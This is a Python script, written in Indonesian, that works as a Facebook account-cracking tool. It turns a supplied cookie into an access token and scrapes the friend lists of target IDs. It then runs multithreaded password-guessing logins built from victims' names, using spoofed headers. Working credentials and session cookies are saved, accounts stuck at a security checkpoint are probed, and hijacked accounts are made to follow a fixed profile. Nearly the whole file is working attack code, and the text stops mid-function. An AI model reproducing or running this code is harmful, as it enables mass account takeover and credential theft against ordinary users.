""" @reverse_exec """

Coded    = ''' Raka Andrian Tara '''
Update   = ''' 5 september 2023 '''
Facebook = ''' Raka Andrian Tara '''
Github   = ''' Bajingan-Z '''

''' Import module '''
import os, sys, random, json, re
from time import sleep as aink_raka
from datetime import datetime
try:
	import requests
	from requests.exceptions import ChunkedEncodingError, ConnectionError
	from bs4 import BeautifulSoup as sop
	from concurrent.futures import ThreadPoolExecutor as RakaXF
	from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
	from rich.columns import Columns as columns
	from rich.console import Console
	from rich import print as vprint
	from rich.panel import Panel as panel
	from rich.tree import Tree
	from rich import print as cetak
except:
	print(f"{RakaAndrian} sedang menginstall bahan module ")
	os.system(("python" if os.name == "nt" else "python3") + " -m pip install requests bs4 futures rich")
	exit(f"{RakaAndrian} silahkan run kembali script nya.\n python manda.py ")
console = Console()
''' Warna print 1 '''
p, m, h, k, b, u, o, n, a = "\x1b[0;97m", "\x1b[0;91m", "\x1b[0;92m", "\x1b[0;93m", "\x1b[0;94m", "\x1b[0;95m", "\x1b[0;96m", "\033[0m", "\033[90;1m"
''' String loops and append '''
RakaAndrian, ses = f" {a}[{k}•{a}]{p}", requests.Session()
ids, ids2, loops, ok, cp = [], [], 0, 0, 0
tampass, pwlu, metode, data, data2 = [], [], [], {}, {}
sys.stdout.write('\x1b]2; Manda | Bajingan-Z \x07')
rc, rr = random.choice, random.randint
''' Convert hari - tanggal - tahun sekarang '''
convert = {"1":"Januari","2":"Februari","3":"Maret","4":"April","5":"Mei","6":"Juni","7":"Juli","8":"Agustus","9":"September","10":"Oktober","11":"November","12":"Desember"}
tgl = datetime.now().day
bln = convert[(str(datetime.now().month))]
thn = datetime.now().year
''' Result crack tersimpan '''
okZ = f"OK-{str(tgl)}-{str(bln)}-{str(thn)}.txt"
cpZ = f"CP-{str(tgl)}-{str(bln)}-{str(thn)}.txt"
''' Warna print 2 '''
b2 = "[bold blue]" # BIRU GELAP TEBAL
o2 = "[bold cyan]" # BIRU CERAH TEBAL
u2 = "[bold purple]" # UNGGU TEBAL
p2 = "[bold white]" # PUTIH TEBAL
z2 = "[bold black]" # HITAM TEBAL
k2 = "[bold yellow]" # KUNING TEBAL
m2 = "[bold red]" # MERAH TEBAL
n2 = "[bold magenta]" # PINK TEBAL
h2 = "[bold green]" # HIJAU TEBAL
l2 = "[bold grey]" # ABU TEBAL
''' Warna print 3 '''
m3 = "#FF0000" # MERAH
h3 = "#00FF00" # HIJAU
k3 = "#FFFF00" # KUNING
b3 = "#00C8FF" # BIRU
u3 = "#AF00FF" # UNGU
n3 = "#FF00FF" # PINK
o3 = "#00FFFF" # BIRU MUDA
p3 = "#FFFFFF" # PUTIH
j3 = "#FF8F00" # JINGGA
a2 = "[#AAAAAA]" # ABU-ABU
wwrc = random.choice([j3,k3,h3,o3,n3,u3,b3])
wwb = random.choice([h,k,o,b,u,a])
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
RC = random.choice([M2, H2, K2, J2, N2, A2, U2, B2, O2])
''' Bannerku '''
def ___raka_XD___():
	os.system('clear')
	vprint(panel(f'''{H2}    __  ____ ______ __☆☆☆☆☆☆☆☆☆☆☆___ ______ ® \n   /  \/   /__    )   )___ _____/  /__    )  {P2}made white by\n  {H2}/       /___)   /  __  )  ___   /___)   / \n /  /\/  /  __   /  / /  / (__/  /  __   / \n/__/ /__/(______/__/ /__/(______/(______/ {P2}    Bajingan-Z ''',title=f'{M2}•{K2}•{H2}•',width=63,style=f'{wwrc}'))
''' Menu utama '''
class MAINmenu:
	
	def __init__(self):
		try:
			cookie = {"cookie": open("cookies.txt","r").read()}
			token = open("token.txt","r").read()
			take  = ses.get('https://graph.facebook.com/me?fields=name&access_token=%s'%(token),cookies = cookie).json();nama = take["name"]
			try:memek = open("token_eaab.txt","r").read()
			except:self.ConvertEaab(cookie)
			self.MENUutama(cookie, token, nama)
		except requests.exceptions.ConnectionError:
			print(f"{RakaAndrian} koneksi internet anda bermasalah..");exit()
		except (KeyError, IOError):
			print(f"{RakaAndrian} cookies invalid... ");aink_raka(1);os.system("rm -rf cookies.txt");os.system("rm -rf token.txt");os.system("clear");self.LOGINcookie()
	def MENUutama(self, cookie, token, nama):
		os.system("clear")
		___raka_XD___()
		print(f"\n{RakaAndrian} Github : {h}github.com/Bazingan-Z\n{RakaAndrian} Joint  : {h}{str(tgl)} {p}-{h} {str(bln)} {p}-{h} 2023\n\n{RakaAndrian} Hai, Selamat Datang {nama}\n\n {a}[{p}1{a}] {p}Crack Publik\n {a}[{p}2{a}] {p}Check Result\n {a}[{p}3{a}] {p}Check Result Ok\n {a}[{p}4{a}] {p}Check Opsi Detector\n {a}[{p}0{a}] {p}Exit ({k} Delete Cookies {p})")
		pilput = input(f"\n{RakaAndrian} Choose : ")
		if pilput in ["a","1"]:
			print(f"\n{RakaAndrian} Gunakan Tanda (,) Untuk Menambahkan Id ")
			orang = input(f"{RakaAndrian} Target Id : ").split(",")
			print()
			for user in orang:
				try:
					apaan = ses.get(f"https://graph.facebook.com/{user}?fields=friends.limit(9999999)&access_token={token}",cookies=cookie).json()
					for x in apaan["friends"]["data"]:
						try:
							if x["id"][:5] in ['10009']:
								pass
							else:
								ids.append(x["id"]+"|"+x["name"])
						except:continue
				except (KeyError,IOError):
					exit(f"\n{RakaAndrian} Target Tidak Publik")
				except requests.exceptions.ConnectionError:
					sys.stdout.write("\r{} {}sinyal aman{} sedang dump : {} ".format(RakaAndrian,h,p,x["id"]),end = "");sys.stdout.flush();aink_raka(0.00040)
			print(f"{RakaAndrian} Total Id Terkumpul : {str(len(ids))} ")
			self.METHODsetting()
		elif pilput in ["b","2"]:
			self.CHECKresult()
		elif pilput in ["puki"]:
			self.MassalV2(cookie, token)
		elif pilput in ["memek"]:
			self.CrackOld()
		elif pilput in ["d","4"]:
			self.CekDetect()
		elif pilput in ["delete","0"]:
			os.system("rm -rf cookies.txt");os.system("rm -rf token.txt")
			print(f"{RakaAndrian} Sukses Menghapus Cookies.. ");aink_raka(1);exit()
		elif pilput in ["c","3"]:
			try:c_o_k = os.listdir('OK')
			except FileNotFoundError:print(f"{RakaAndrian} Ups. Tidak Ada Hasil Crack Ok:(... ");aink_raka(1);exit()
			if len(c_o_k)==0:print(f"{RakaAndrian} ups. tidak ada hasil crack ok:(... ");aink_raka(1);exit()
			else:
				print(f"{RakaAndrian} hasil crack ok.\n ")
				cuih, Lucu = 0, {}
				for kaoo in c_o_k:
					try:raka = open('OK/'+kaoo,'r').readlines()
					except:continue
					cuih+=1
					kaoo = kaoo.lower()
					if cuih<10:
						__oo = '0'+str(cuih)
						Lucu.update({str(cuih):str(kaoo)})
						Lucu.update({__oo:str(kaoo)})
						print(f" {__oo}. {kaoo} • {str(len(raka))} account ")
					else:
						Lucu.update({str(cuih):str(kaoo)})
						print(f" {cuih}. {kaoo} • {str(len(raka))} account")
				print(f"\n{RakaAndrian} pilih hasil untuk ditampilkan")
				Ini = input(f"{RakaAndrian} choose : ")
				try:Pantek = Lucu[Ini]
				except KeyError:print(f"{RakaAndrian} pilihan tidak ada... ");exit()
			one = 0
			Akunmu = open(f"OK/{Pantek}","r").readlines()
			for Goblog in Akunmu:
				User = Goblog.replace("\n", "")
				AccMu = User.split("|")
				one+=1
				print()
				print(f" {one}. {AccMu[0]}|{AccMu[1]}|{AccMu[2]} ")
				print(f"{RakaAndrian}{self.CekNameMokad(AccMu[0])} ")
				print(f"{RakaAndrian}{self.CekTem(AccMu[0])} ")
				self.TakeApk(AccMu[2])
			print(f"{RakaAndrian} hasil live/dead : {ok}|{cp}")
		else:
			print(f"{RakaAndrian} selamat tinggal... ");exit()
	def CekDetect(self):
		try:c_o_k = os.listdir('CP')
		except FileNotFoundError:print(f"{RakaAndrian} ups. tidak ada hasil crack cp:(... ");aink_raka(1);exit()
		if len(c_o_k)==0:print(f"{RakaAndrian} ups. tidak ada hasil crack cp:(... ");aink_raka(1);exit()
		else:
			print(f"{RakaAndrian} hasil crack cp.\n ")
			cuih, Lucu = 0, {}
			for kaoo in c_o_k:
				try:raka = open('CP/'+kaoo,'r').readlines()
				except:continue
				cuih+=1
				kaoo = kaoo.lower()
				if cuih<10:
					__oo = '0'+str(cuih)
					Lucu.update({str(cuih):str(kaoo)})
					Lucu.update({__oo:str(kaoo)})
					print(f" {__oo}. {kaoo} • {str(len(raka))} account ")
				else:
					Lucu.update({str(cuih):str(kaoo)})
					print(f" {cuih}. {kaoo} • {str(len(raka))} account")
			print(f"\n{RakaAndrian} pilih hasil untuk ditampilkan")
			Ini = input(f"{RakaAndrian} choose : ")
			try:Pantek = Lucu[Ini]
			except KeyError:print(f"{RakaAndrian} pilihan tidak ada... ");exit()
		one = 0
		Akunmu = open(f"CP/{Pantek}","r").readlines()
		for Goblog in Akunmu:
			User = Goblog.replace("\n", "")
			AccMu = User.split("|")
			one+=1
			print()
			tree = Tree("                         ")
			tree.add(f" {o}{one}.{p} {AccMu[0]}|{AccMu[1]} ");aink_raka(0.3)
			try:self.OpsiCek(AccMu[0], AccMu[1], tree)
			except (ConnectionError,ChunkedEncodingError):aink_raka(31)
		print(f"\n{RakaAndrian} hasil lolos {ok}")
	def OpsiCek(self, user, pw, tree):
		global ok
		url = "https://d.facebook.com"
		ses.headers.update({"Host":"d.facebook.com","accept":"*/*","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":url,"user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]","upgrade-insecure-requests":"1"})
		soup = sop(ses.get(url+"/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl&refid=8").text,"html.parser")
		link = soup.find("form",{"method":"post"})
		for x in soup("input"):
			data.update({x.get("name"):x.get("value")})
		data.update({"email":user,"pass":pw})
		urlPost = ses.post(url+link.get("action"),data=data)
		response = sop(urlPost.text, "html.parser")
		if "c_user" in ses.cookies.get_dict():
			if "Akun Anda Dikunci" in urlPost.text:
				tree.add(f"{k}akun terkena sesi kunci..{p}")
			else:
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree.add(f"{p}yeah akun tidak checkpoint!!!").add(f"{h}{coki}{p}")
				#tree.add(f"{h}{agent}{p}")
				open("Tapyes.txt","a").write("%s|%s|%s\n"%(user,pw,coki))
				ok+=1
		elif "checkpoint" in ses.cookies.get_dict():
			coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
			title = re.findall("\<title>(.*?)<\/title>",str(response))
			link2 = response.find("form",{"method":"post"})
			listInput = ['lsd','fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
			for x in response("input"):
				if x.get("name") in listInput:
					data2.update({x.get("name"):x.get("value")})
			an = ses.post(url+link2.get("action"),data=data2)
			response2 = sop(an.text,"html.parser")
			cek = [cek.text for cek in response2.find_all("option")]
			number = 0
			tree.add(f"{p}  •  terdapat {str(len(cek))} opsi akun{p} : ")
			if(len(cek)==0):
				if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
					tree.add(f"{p}yeah akun tapyes!!!").add(f"{h}{coki}{p}")
					#tree.add(f"{h}{agent}{p}")
					open("Tapyes.txt","a").write("%s|%s\n"%(user,pw))
					ok+=1
				elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
					tree.add(f"   {m}akun terpasang a2f..{p}")
				else:tree.add(f"   {m}terjadi kesalahan pada akun..{p}")
			else:
				if "c_user" in ses.cookies.get_dict():
					coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree.add(f"{p}yeah akun tapyes!!!").add(f"{h}{coki}{p}")
					#tree.add(f"{h}{agent}{p}")
					open("Tapyes.txt","a").write("%s|%s\n"%(user,pw))
					ok+=1
			for opsi in range(len(cek)):
				number +=1
				tree.add(f"   {o}{number}{p}. {cek[opsi]}")
		elif "login_error" in str(response):
			oh = run.find("div",{"id":"login_error"}).find("div").text
			tree.add(f"{m}{oh}{p}")
		else:
			tree.add(f"{m}katasandi salah atau mungkin sudah diubah..")
		vprint(tree)
	''' Biar gak mokad acc nya '''
	def YaSekedarMengingatkan(self,kuki,uiz,pw):
		cookie = {"cookie": kuki}
		with requests.Session() as ses:
			try:
				for KontolJawir in sop(ses.get('https://mbasic.facebook.com/100000834003593',cookies = cookie).content,'html.parser').find_all('a',href=True):
					if 'subscribe.php' in KontolJawir['href']:
						Pukimak = ses.get('https://mbasic.facebook.com%s'%(KontolJawir['href']),cookies = cookie)
			except Exception as e:pass
		self.Apabila(kuki,uiz,pw)
	''' Check result '''
	def CHECKresult(self):
		print(f"\n [o] hasil crack ok\n [c] hasil crack cp ")
		print()
		CekHasil = input(f"{RakaAndrian} choose : ")
		if CekHasil in ["o","1"]:
			try:c_o_k = os.listdir('OK')
			except FileNotFoundError:print(f"{RakaAndrian} ups. tidak ada hasil crack ok:(... ");aink_raka(1);exit()
			if len(c_o_k)==0:print(f"{RakaAndrian} ups. tidak ada hasil crack ok:(... ");aink_raka(1);exit()
			else:
				print(f"{RakaAndrian} hasil crack ok.\n ")
				cuih, Lucu = 0, {}
				for kaoo in c_o_k:
					try:raka = open('OK/'+kaoo,'r').readlines()
					except:continue
					cuih+=1
					kaoo = kaoo.lower()
					if cuih<10:
						__oo = '0'+str(cuih)
						Lucu.update({str(cuih):str(kaoo)})
						Lucu.update({__oo:str(kaoo)})
						print(f" {__oo}. {kaoo} • {str(len(raka))} account ")
					else:
						Lucu.update({str(cuih):str(kaoo)})
						print(f" {cuih}. {kaoo} • {str(len(raka))} account")
				print(f"\n{RakaAndrian} pilih hasil untuk ditampilkan")
				Ini = input(f"{RakaAndrian} choose : ")
				try:Pantek = Lucu[Ini]
				except KeyError:print(f"{RakaAndrian} pilihan tidak ada... ");exit()
				try:Okep = open('OK/'+Pantek,'r').read()
				except:print(f"{RakaAndrian} file tidak ditemukan... ");exit()
				print(f"{RakaAndrian} list akun ok kamu\n") 
				os.system('cd OK && cat '+Pantek);print(f"\n{RakaAndrian} list akun ok kamu");exit()
		elif CekHasil in ["c","2"]:
			try:c_o_k = os.listdir("CP")
			except FileNotFoundError:print(f"{RakaAndrian} ups. tidak ada hasil crack cp:(... ");aink_raka(1);exit()
			if len(c_o_k)==0:print(f"{RakaAndrian} ups. tidak ada hasil crack cp:(... ");aink_raka(1);exit()
			else:
				print(f"{RakaAndrian} hasil crack cp.\n ")
				cuih, Lucu = 0, {}
				for kaoo in c_o_k:
					try:raka = open('CP/'+kaoo,'r').readlines()
					except:continue
					cuih+=1
					kaoo = kaoo.lower()
					if cuih<10:
						__oo = '0'+str(cuih)
						Lucu.update({str(cuih):str(kaoo)})
						Lucu.update({__oo:str(kaoo)})
						print(f" {__oo}. {kaoo} • {str(len(raka))} account ")
					else:
						Lucu.update({str(cuih):str(kaoo)})
						print(f" {cuih}. {kaoo} • {str(len(raka))} account")
				print(f"\n{RakaAndrian} pilih hasil untuk ditampilkan")
				Ini = input(f"{RakaAndrian} choose : ")
				try:Pantek = Lucu[Ini]
				except KeyError:print(f"{RakaAndrian} pilihan tidak ada... ");exit()
				try:Okep = open('CP/'+Pantek,'r').read()
				except:print(f"{RakaAndrian} file tidak ditemukan... ");exit()
				print(f"{RakaAndrian} list akun cp kamu\n") 
				os.system('cd CP && cat '+Pantek);print(f"\n{RakaAndrian} list akun cp kamu");exit()
		else:print(f"{RakaAndrian} Selamat Tinggal... ");aink_raka(1);exit()
	''' Setting method '''
	def METHODsetting(self):
		for rakaxxx in ids:
			xx = random.randint(0,len(ids2))
			ids2.insert(xx,rakaxxx)
		print("\r")
		meki = input(f"{RakaAndrian} Tambahkan Password Manual {h}y{p}/{k}t{p} : ")
		if meki in ["y","Y"]:
			tampass.append("tambahkan")
			pastam = input(f"{RakaAndrian} Masukan Tambahan : ")
			pwtod = pastam.split(",")
			for pwlist in pwtod:
				pwlu.append(pwlist)
		else:pass
		self.Langsung()
	''' Mulai crack/Setting password wordlist '''
	def Langsung(self):
		input(f"{RakaAndrian} Enter Untuk Mulai Crack...")
		os.system("clear")
		global Raka, Andrian
		try:EwePaksa = requests.get("http://ip-api.com/json/").json()
		except:EwePaksa = {'-'}
		try:IP = EwePaksa["query"]
		except:IP = {'-'}
		try:rasis_Z_K_X_= EwePaksa["city"]
		except:rasis_Z_K_X_ = {'-'}
		os.system("clear"); ___raka_XD___()
		ajg = []
		ajg.append(panel(f"{H2}Stay In {rasis_Z_K_X_}",width=31,padding=(0,2),style=f"{wwrc}"));ajg.append(panel(f"{H2}Joint {tgl}-{bln}-{thn}",width=31,padding=(0,2),style=f"{wwrc}"));console.print(columns(ajg))
		awal = datetime.now()
		Raka = Progress(TextColumn('{task.description}'))
		Andrian = Raka.add_task('',total=len(ids))
		with Raka:
			with RakaXF(max_workers=30) as RakaXD:
				for koncol in ids2 or ids:
					try:
						pwr = ["sayangku","sayang123"]
						uiz = koncol.split("|")[0]
						nama = koncol.split("|")[1]
						depan = nama.split(" ")[0]
						if len(nama)<=5:
							if len(depan)<3:pass 
							else:
								pwr.append(depan+"123")
#								pwr.append(depan+"12345")
								pwr.append(depan+"1234")
						else:
							if len(depan)<3:pwr.append(nama)
							else:
								pwr.append(nama)
								pwr.append(depan+"1"+str(rr(1,9)))
#								pwr.append(depan+"123")
								pwr.append(depan+"12345")
								pwr.append(depan+"123456")
							belakang = nama.split(" ")[1]
							if len(belakang)<3:
								pwr.append(depan+belakang)
							else:
								pwr.append(depan+belakang)
								pwr.append(depan+belakang+"123")
								pwr.append(belakang+"1234")
								pwr.append(belakang+"2"+str(rr(1,9)))
						if "tambahkan" in tampass:
							for ajg in pwlu:pwr.append(ajg)
						else:pass
						RakaXD.submit(self.Krek,uiz,pwr,awal)
					except:
						RakaXD.submit(self.Krek,uiz,pwr,awal)

		print()
		if ok != 0 or cp != 0:
			kanjud = []
			kanjud.append(panel(f"{P2} Result CP : {K2}{cp}",width=31,padding=(0,2),style=f"{wwrc}"))
			kanjud.append(panel(f"{P2} Result OK : {H2}{ok}",width=31,padding=(0,2),style=f"{wwrc}"));console.print(columns(kanjud));exit()
		else:
			kintil = []
			kintil.append(panel(f"{P2}kok gada hasil? makanya ganteng klo gk ganteng kemungkinan kecil dapet result, intinya harus ganteng ajg:v",width=63,style=f"{wwrc}"));console.print(columns(kintil));exit()
	''' Login cookies '''
	def LOGINcookie(self):
		cookie = input(f"{RakaAndrian} Masukan Cookie : ")
		try:
			ses.headers.update({'content-type': 'application/x-www-form-urlencoded'})
			data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
			response = json.loads(ses.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
			code, user_code = response['code'], response['user_code']
			verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
			ses.headers.pop('content-type')
			ses.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
			response2 = ses.get(verification_url, cookies = {'cookie': cookie}).text
			if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
				print(f"{RakaAndrian} Cookie Invalid Kek Tete Jendes... ");exit()
			else:
				action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
				data = {'fb_dtsg': re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1),'jazoest': re.search('name="jazoest" value="(\d+)"', str(response2)).group(1),'qr': 0,'user_code': response['user_code']}
				ses.headers.update({'origin': 'https://m.facebook.com','referer': 'https://m.facebook.com/device?user_code={}'.format(user_code),'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
				response3 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cookie})
				if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
					ses.headers.pop('content-type');ses.headers.pop('origin')
					response4 = ses.post(response3.url, data = data, cookies = {'cookie': cookie}).text
					action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
					ses.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
					data = {'fb_dtsg': re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1),'jazoest': re.search('name="jazoest" value="(\d+)"', str(response4)).group(1),'scope': re.search('name="scope" value="(.*?)"', str(response4)).group(1),'display': re.search('name="display" value="(.*?)"', str(response4)).group(1),'user_code': re.search('name="user_code" value="(.*?)"', str(response4)).group(1),'logger_id': re.search('name="logger_id" value="(.*?)"', str(response4)).group(1),'auth_type': re.search('name="auth_type" value="(.*?)"', str(response4)).group(1),'encrypted_post_body': re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1),'return_format[]': re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)}
					response5 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cookie}).text
					windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
					ses.headers.pop('content-type');ses.headers.pop('origin')
					ses.headers.update({'referer': 'https://m.facebook.com/',})
					response6 = ses.get(windows_referer, cookies = {'cookie': cookie}).text
					if "Sukses!" in str(response6):
						ses.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
						response7 = ses.get(status_url, cookies = {'cookie': cookie}).text
						access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
						print(f"{RakaAndrian} Login Berhasil...\n{RakaAndrian} Jalankan Ulang Scriptnya.\n{RakaAndrian} Ketik python manda_v1.py ");aink_raka(1);open("cookies.txt","w").write(cookie);open("token.txt","w").write(access_token)
						exit()
					else:
						print(f"{RakaAndrian} Cookie Anda Invalid Kek Tete Jendes... ");exit()
		except Exception as e:
			print(f"{RakaAndrian} Cookie Anda Invalid Kek Tete Jendes... ");exit()
		except ConnectionError:
			print(f"{RakaAndrian} Sinyal Anda Bermasalah Kontol... ");exit()
	''' Langsung krek coeg '''
	def Krek(self,uiz,pwr,awal):
		global ok, cp, loops
		ahir = str(datetime.now()-awal).split('.')[0]
		rr, rc, ses = random.randint, random.choice, requests.Session()
		Inlocale= rc(["vi-VN,vi;q=0.9","ar-AR,ar;q=0.9","bg-BG,bg;q=0.9","bs-BA,bs;q=0.9","ca-ES,ca;q=0.9","da-DK,da;q=0.9","el-GR,el;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","es-LA,es;q=0.9","es-ES,es;q=0.9","fa-IR,fa;q=0.9","fi-FI,fi;q=0.9","fr-FR,fr;q=0.9","hi-IN,hi;q=0.9","hr-HR,hr;q=0.9","fr-CA,fr;q=0.9","id-ID,id;q=0.9","it-IT,it;q=0.9","ko-KR,ko;q=0.9","mk-MK,mk;q=0.9","ms-MY,ms;q=0.9","pl-PL,pl;q=0.9","pt-BR,pt;q=0.9","pt-PT,pt;q=0.9","ro-RO,ro;q=0.9","sl-SL,sl;q=0.9","sr-RS,sr;q=0.9","th-TH,th;q=0.9"])
		RK = random.choice([H2, K2, N2, A2, B2])
		Raka.update(Andrian,description=f" {RK}Running {a}[{P2}{loops}/{len(ids or ids2)}{a}] [{H2}{ok}{P2}/{K2}{cp}{a}][/] {RK}{ahir}")
		Raka.advance(Andrian)
		MozillaAgent = self.random_ua_realme(uiz)
		dataku, headersku = {}, {}
		for pw in pwr:
			pw = pw.lower()
			try:
				ch_r = rc([f"{str(rr(40,60))}.0.{str(rr(2000,2999))}",f"{str(rr(70,90))}.0.{str(rr(3000,3999))}",f"{str(rr(100,115))}.0.{str(rr(4000,5999))}"])
				Type = rc(["Windows Phone","IEMobile","Firefox"])
				rt = ses.get(f"https://x.facebook.com/login.php?skip_api_login=1&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16&fb_api_req_friendly_name=authenticate&cpl=true&sig=4f648f21fb58fcd2aa1c65f35f441ef5&sdk_version=3&sdk=android")
				dataku.update({"m_ts": re.search('name="m_ts" value="(.*?)"',str(rt.text)).group(1),"li": re.search('name="li" value="(.*?)"',str(rt.text)).group(1),"try_number": re.search('name="try_number" value="(.*?)" data-sigil="(.*?)"',str(rt.text)).group(1),"unrecognized_tries": re.search('name="unrecognized_tries" value="(.*?)" data-sigil="(.*?)"',str(rt.text)).group(1),"email": uiz,"prefill_contact_point": "","prefill_source": "", "prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "true","is_smart_lock": "true","bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"',str(rt.text)).group(1),"pass": pw,"jazoest": re.search('name="jazoest" value="(.*?)" autocomplete="(.*?)"',str(rt.text)).group(1),"lsd": re.search('name="lsd" value="(.*?)" autocomplete="(.*?)"',str(rt.text)).group(1),"__dyn": "","__csr": "","__a": "","__user": "0","_fb_noscript": "true","navigator.userAgent.indexOf": f'("{Type}")!==-1',"window.devicePixelRatio>": "1","document.location.reload()})": '(true, "m_pixel_ratio", "wd", false);</'})
				headersku.update({"Host": "x.facebook.com","content-length": str(rr(2100,2200)),"sec-ch-ua": f'"Chromium";v="{str(rr(40,115))}", "Google Chrome";v="{str(rr(40,115))}", "Not;A=Brand";v="{str(rr(8,100))}"',"sec-ch-ua-mobile": "?1","user-agent": MozillaAgent,"viewport-width": "360","x-response-format": "JSONStream","x-fb-lsd": re.search('name="lsd" value="(.*?)" autocomplete="(.*?)"',str(rt.text)).group(1),"sec-ch-ua-platform-version": f'"{str(rr(5,13))}.0.0"',"content-type": "application/x-www-form-urlencoded","x-requested-with": "XMLHttpRequest","x-asbd-id": "129477","sec-ch-ua-full-version-list": f'"Chromium";v="{ch_r}.{str(rr(10,199))}", "Google Chrome";v="{ch_r}.{str(rr(10,199))}", "Not;A=Brand";v="{str(rr(8,100))}.0.0.0"',"sec-ch-prefers-color-scheme": "dark","sec-ch-ua-platform": '"Android"',"accept": "*/*","origin": "https://x.facebook.com","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": f"https://x.facebook.com/login.php?skip_api_login=1&api_key=673654156003625&kid_directed_site=0&app_id=673654156003625&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D673654156003625%26cbt%3D1691585394558%26e2e%3D%257B%2522init%2522%253A1691585394558%257D%26ies%3D1%26sdk%3Dandroid-16.0.1%26sso%3Dchrome_custom_tab%26nonce%3Dc3e0a62e-9619-4dfa-9634-4884fc9540a9%26scope%3Duser_birthday%252Copenid%252Cpublic_profile%252Cuser_gender%252Cuser_location%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522973133a6-7e65-4813-aa34-8926a027af9f%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522vaf2mrk9j7e7qhcbeq9u%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.de.mobiletrend.lovidoo%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DCzEY2ZBfRBzQFV9zQiNjLZxfMTODPpH5s0siYgFx6to%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D973133a6-7e65-4813-aa34-8926a027af9f%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.de.mobiletrend.lovidoo%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522973133a6-7e65-4813-aa34-8926a027af9f%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522vaf2mrk9j7e7qhcbeq9u%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","accept-encoding": "gzip, deflate, br","sec-websocket-version": str(rr(5,13)),"accept-language": Inlocale})
				ses.post(f"https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",headers = headersku, data = dataku, allow_redirects = False)
